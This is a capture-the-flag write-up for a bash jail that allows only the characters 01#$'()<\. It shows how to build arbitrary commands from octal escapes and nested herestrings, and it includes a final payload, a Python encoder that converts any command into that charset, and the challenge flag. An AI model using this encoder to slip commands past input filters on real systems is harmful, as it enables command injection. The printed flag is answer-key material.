## analysis
With some quick trial and error (trying all printable chars), we can obtain the valid charset this shell accepts.

```
01#$'()<\
```

That is very little indeed.

## step 1: numbers
Obviously at some point we need to obtain letters, and before that we need numbers.

A great candidate would be octal representation of characters `\000`.

How would we obtain numbers?

We can use `$((2#00010))` to convert from binary representation to decimal.

And we can obtain the 2 via `$((1<<1))`.

Putting them together we can now construct any number with `$(($((1<<1))#000101))`.

## step 2: characters

> Characters can be written as the octal form `\nnn` using numbers.

However, simply putting numbers together doesn't make them letters. ðŸ˜¢

The escape sequence `ls` can be written as `\\1$(($((1<<1))#101))$(($((1<<1))#100))\\1$(($((1<<1))#110))$(($((1<<1))#11))`.
But it would not run as `ls`.

I got stuck on this for a long time (very long time), until I stumbled upon writeups for a past CTF challenge `minbashmaxfun`.

I can use `bash<<<\$\'\\1$(($((1<<1))#101))$(($((1<<1))#100))\\1$(($((1<<1))#110))$(($((1<<1))#11))\'` to run `ls`.

And since we are in bash, that would mean `$0<<<'...'`.

## step 3: spaces

However, we still have another issue.

Using the above method we can indeed run any command, but arguments (and spaces) are interpreted as part of the command.

I, again, got stuck for quite a while until I stumbled upon another writeup for the same challenge `minbashmaxfun`.

The solution is simple, use another layer of `bash<<<`.

The final solution would be something like this.

```bash
bash<<<bash\<\<\<\$\'cat(smthhere)flag.txt\' # space here is in escape form
bash<<<$'cat flag.txt' # space becomes a space
cat flag.txt # profit
```

## solve script

The final payload is.

```bash
$0<<<$0\<\<\<\$\'\\1$(($((1<<1))#100))$(($((1<<1))#11))\\1$(($((1<<1))#100))1\\1$(($((1<<1))#110))$(($((1<<1))#100))\\0$(($((1<<1))#100))0\\1$(($((1<<1))#100))$(($((1<<1))#110))\\1$(($((1<<1))#101))$(($((1<<1))#100))\\1$(($((1<<1))#100))1\\1$(($((1<<1))#100))$(($((1<<1))#111))\\0$(($((1<<1))#101))$(($((1<<1))#110))\\1$(($((1<<1))#110))$(($((1<<1))#100))\\1$(($((1<<1))#111))0\\1$(($((1<<1))#110))$(($((1<<1))#100))\'
```

The translator is a python script I wrote.

```python
import string


def repl_nums(c):
    if c in '01':
        return c
    return f"$(($((1<<1))#{bin(int(c))[2:]}))"


def t(c):
    # if c not in "01#$'()<\\":
    return '\\\\'+''.join([repl_nums(_) for _ in oct(ord(c))[2:].zfill(3)])
    # return c

payload = "cat flag.txt"
payload = ''.join([t(c) for c in payload])
out = f"$0<<<$0\\<\\<\\<\\$\\'{payload}\\'"
print(out)
```

```flag
TFCCTF{fb1_0p3n_up!!!!__0x410x410x410x41}
```
